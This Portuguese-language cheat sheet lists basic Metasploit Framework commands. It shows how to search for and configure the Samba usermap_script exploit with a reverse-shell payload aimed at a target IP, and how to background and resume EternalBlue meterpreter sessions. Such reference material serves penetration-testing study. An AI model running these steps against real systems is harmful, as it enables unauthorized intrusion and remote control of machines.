# Comandos básicos do Metasploit-Framework

$searchsploit <name service> [smb, dns, http, smtp, ftp, Apache, ProFTPd, vsftpd, etc]

## Diretório do Metasploit-Framework

$ls -l /usr/share/metasploit-framework

## Run Metasploit-Framework

$sudo service postgresql start

$sudo msfdb init

$sudo msfconsole

msf > db_status

msf > help

msf > help search

msf > history

msf > show [auxiliary, exploits, payloads, options, targets, advanced, encoders, nops]

msf > search scanner

msf > search name:mysql

msf > search type:exploit platform:windows

msf > search type:exploit rank:great

msf > search cve:2022 platform:windows type:exploit

msf > grep http search oracle

msf > search type:exploit usermap_script

msf > info exploit/multi/samba/usermap_script

msf > use exploit/multi/samba/usermap_script

msf exploit(multi/samba/usermap_script) > help

msf exploit(multi/samba/usermap_script) > info

msf exploit(multi/samba/usermap_script) > show -h

msf exploit(multi/samba/usermap_script) > show targets

msf exploit(multi/samba/usermap_script) > show options

msf exploit(multi/samba/usermap_script) > show payloads

msf exploit(multi/samba/usermap_script) > set RHOST IP_Address_Target

msf exploit(multi/samba/usermap_script) > set PAYLOAD cmd/unix/reverse

msf exploit(multi/samba/usermap_script) > set LHOST IP_Address_Local_Host

msf exploit(multi/samba/usermap_script) > unset PAYLOAD

msf exploit(multi/samba/usermap_script) > unset all

msf exploit(multi/samba/usermap_script) > run

msf exploit(multi/samba/usermap_script) > back

msf > jobs

msf > kill 0

msf > sessions -l

msf > connect 192.168.1.123 23

msf > exit

## Run Exploit Sessions in Backgroung

msf exploit(windows/smb/ms17_010_eternalblue) > exploit

meterpreter > background

msf exploit(windows/smb/ms17_010_eternalblue) > sessions

msf exploit(windows/smb/ms17_010_eternalblue) > sessiosn -i 1

meterpreter >
